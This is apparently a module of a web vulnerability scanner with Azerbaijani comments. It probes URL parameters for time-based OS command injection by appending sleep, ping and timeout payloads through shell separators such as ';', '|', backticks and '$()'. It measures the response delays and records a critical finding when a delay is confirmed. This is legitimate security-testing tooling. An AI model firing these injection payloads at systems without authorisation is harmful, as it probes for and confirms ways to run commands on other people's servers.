"""
MODUL: COMMAND INJECTION (vaxt-əsaslı)
======================================
Saytın inputu birbaşa OS əmrinə qoşması = hücumçu serverdə əmr işlədə bilər.

NECƏ (zərərsiz, vaxt-əsaslı): inputa "gözlə" əmri (sleep) qoyuruq.
Əgər cavab məhz o qədər gec gəlirsə, deməli əmr işləyir = zəiflik var.
Heç nə silmir/pozmur — yalnız serverə "bir az gözlə" deyir.
"""

import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core import http_client

GOZLEME = 5   # saniyə
PAYLOADLAR = [f";sleep {GOZLEME}", f"| sleep {GOZLEME}", f"& sleep {GOZLEME}",
              f"`sleep {GOZLEME}`", f"$(sleep {GOZLEME})", f"&& sleep {GOZLEME}",
              f"|| sleep {GOZLEME}", f"%0asleep {GOZLEME}", f"';sleep {GOZLEME};'",
              f"\";sleep {GOZLEME};\"", f"| ping -c {GOZLEME} 127.0.0.1",
              f"& timeout {GOZLEME}"]


def _vaxt_olc(url, timeout):
    t0 = time.time()
    http_client.al(url, timeout=timeout)
    return time.time() - t0


def _test_et(url, param, parcalar, parametrler, hesabat, timeout):
    # Baza vaxtını 2 ölçünün ƏN BÖYÜĞÜ kimi götür (şəbəkə dəyişkənliyinə davamlı)
    baza = max(_vaxt_olc(url, timeout), _vaxt_olc(url, timeout))
    # Astana: baza + gözləmənin 80%-i (şəbəkə sıçrayışını kritik saymasın)
    astana = baza + GOZLEME * 0.8

    for p in PAYLOADLAR:
        yeni = {k: v[0] for k, v in parametrler.items()}
        yeni[param] = yeni[param] + p
        test_url = urlunparse(parcalar._replace(query=urlencode(yeni)))
        if _vaxt_olc(test_url, GOZLEME + timeout + 4) < astana:
            continue
        # TƏSDİQ: ikinci dəfə də gecikməlidir (bir anlıq sıçrayış deyil)
        if _vaxt_olc(test_url, GOZLEME + timeout + 4) >= astana:
            hesabat.elave_et("kritik", "cmd_injection", test_url, param=param)
            return True
    return False


def yoxla(parametrli_url, hesabat, timeout=8):
    for url in parametrli_url:
        parcalar = urlparse(url)
        parametrler = parse_qs(parcalar.query)
        for param in parametrler:
            if _test_et(url, param, parcalar, parametrler, hesabat, timeout):
                break
